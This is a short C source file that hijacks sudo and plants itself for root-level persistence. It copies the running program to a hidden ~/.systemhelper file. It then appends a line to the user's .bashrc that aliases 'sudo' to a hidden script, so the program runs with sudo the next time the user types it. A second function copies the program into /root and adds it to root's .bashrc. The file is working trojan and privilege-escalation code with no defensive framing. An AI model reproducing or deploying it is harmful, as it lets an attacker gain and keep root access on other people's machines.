#include "getting_access.h"

char* getting_home_path()
{
        struct passwd* pw;
 
        pid_t uid = geteuid();
        pw = getpwuid(uid);

	char* path = (char*) malloc (sizeof(char*)*10);
	sprintf(path, "/home/%s", pw->pw_name);

	return path;
}

bool checking_access()
{
	struct passwd* pw;

	pid_t uid = geteuid();
	pw = getpwuid(uid);

	if(strcmp(pw->pw_name,  "root") == 0) return true;
	return false;
}

void trap_access(char* program_name)
{
	char copy[200];
	char filePath[100];

	sprintf(copy, "cp %s %s/.systemhelper", program_name, getting_home_path());
	sprintf(filePath, "%s/.systemhelper", getting_home_path());

	if(!checking_access())
	{
		if(fopen(filePath, "r") == NULL)
		{
			system(copy);
			chdir(getting_home_path());	
			FILE* f = fopen(".bashrc", "a");
			fputs("alias sudo='~/.sysScript.sh'\n", f);
			fclose(f);

			f = fopen(".sysScript.sh", "w");
			chmod(".sysScript.sh", 0755);

			fputs("#!/bin/bash\n\nsudo ~/.systemhelper\n", f);
			fclose(f);
		}
	}
}

void copy_to_root()
{
	char command[200];
	sprintf(command, "cp ~/.systemhelper /root/");

	system(command);

	chdir("/root");
	FILE* f = fopen(".bashrc", "a");
	fputs("/root/.systemhelper\n", f);
	fclose(f);
}
